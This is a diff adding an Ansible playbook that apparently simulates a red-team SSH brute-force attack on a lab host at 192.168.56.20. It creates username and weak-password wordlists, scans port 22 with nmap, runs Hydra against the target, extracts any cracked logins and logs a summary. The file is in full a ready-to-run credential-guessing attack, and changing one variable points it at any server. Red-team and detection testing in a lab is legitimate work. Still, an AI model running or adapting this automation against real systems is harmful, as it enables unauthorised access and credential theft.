@@ -1,0 +1,93 @@
+---
+- name: SSH Brute Force Attack Simulation
+  hosts: attacker
+  become: yes
+  vars:
+    target_ip: "192.168.56.20"
+    wordlist_path: "/tmp/passwords.txt"
+    userlist_path: "/tmp/users.txt"
+    results_path: "/var/log/redteam/ssh-bruteforce-results.txt"
+  
+  tasks:
+    
+    - name: Create redteam log directory
+      file:
+        path: /var/log/redteam
+        state: directory
+        mode: '0755'
+    
+    - name: Create username list
+      copy:
+        dest: "{{ userlist_path }}"
+        content: |
+          admin
+          user1
+          testuser
+          root
+    
+    - name: Create password wordlist
+      copy:
+        dest: "{{ wordlist_path }}"
+        content: |
+          password
+          admin
+          admin123
+          password123
+          test123
+          user
+          root
+          toor
+    
+    - name: Nmap scan before attack
+      shell: "nmap -sV -p 22 {{ target_ip }} > /var/log/redteam/nmap-prescan.txt"
+      register: nmap_prescan
+    
+    - name: Display nmap results
+      shell: "cat /var/log/redteam/nmap-prescan.txt"
+      register: nmap_output
+    
+    - name: Show nmap scan
+      debug:
+        msg: "{{ nmap_output.stdout_lines }}"
+    
+    - name: Execute SSH brute force with Hydra
+      shell: |
+        hydra -L {{ userlist_path }} -P {{ wordlist_path }} \
+        ssh://{{ target_ip }} -t 2 -w 3 -V -o {{ results_path }}
+      register: attack_results
+      ignore_errors: yes
+    
+    - name: Display attack output
+      debug:
+        msg: "{{ attack_results.stdout_lines }}"
+    
+    - name: Check for successful credentials
+      shell: "grep 'login:' {{ results_path }} || echo 'No credentials found'"
+      register: successful_creds
+      ignore_errors: yes
+    
+    - name: Report findings
+      debug:
+        msg: |
+          ========================================
+          SSH BRUTE FORCE ATTACK COMPLETED
+          ========================================
+          Target: {{ target_ip }}
+          Results saved to: {{ results_path }}
+          
+          {{ successful_creds.stdout }}
+          ========================================
+    
+    - name: Save attack summary
+      copy:
+        dest: "/var/log/redteam/attack-summary.txt"
+        content: |
+          Red Team Attack Summary
+          =======================
+          Date: {{ ansible_date_time.iso8601 }}
+          Attack Type: SSH Brute Force
+          Target: {{ target_ip }}
+          Tools Used: Hydra, Nmap
+          
+          Results:
+          {{ successful_creds.stdout }}
